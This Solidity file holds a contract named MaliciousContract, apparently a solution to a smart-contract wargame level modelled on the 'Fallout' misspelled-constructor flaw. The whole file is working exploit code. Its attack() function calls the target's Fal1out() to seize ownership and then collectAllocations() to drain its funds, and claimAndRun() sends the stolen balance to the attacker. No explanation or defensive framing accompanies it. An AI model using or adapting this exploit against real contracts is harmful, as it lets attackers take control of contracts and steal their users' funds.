// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address payable public vulnerableScAddress;
    address payable public attacker;

    constructor(address payable _vulnerableScAddress) {
        vulnerableScAddress = _vulnerableScAddress;
        attacker = payable(msg.sender);
    }

    function attack() public payable {
        // Claim ownership via fal1out function.
        vulnerableScAddress.call(abi.encodeWithSignature("Fal1out()"));

        // Drain funds via collectAllocations.
        vulnerableScAddress.call(
            abi.encodeWithSignature("collectAllocations()")
        );
    }

    function claimAndRun() public {
        require(msg.sender == attacker, "not your bounty, buddy.");
        attacker.transfer(address(this).balance);
    }
}
